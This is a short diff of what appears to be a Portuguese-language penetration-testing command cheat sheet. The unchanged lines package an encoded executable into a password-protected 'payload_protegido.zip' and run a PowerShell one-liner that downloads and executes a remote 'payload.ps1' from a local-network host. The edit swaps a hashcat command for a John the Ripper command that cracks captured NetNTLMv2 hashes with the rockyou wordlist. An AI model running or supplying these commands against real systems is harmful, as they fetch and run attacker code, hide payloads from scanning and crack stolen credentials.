@@ -16,5 +16,5 @@ zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
 
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')
 
-hashcat -m 5600 -a 0 --force --opencl-device-types 1 hashcapturado.txt /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash_john.txt
 
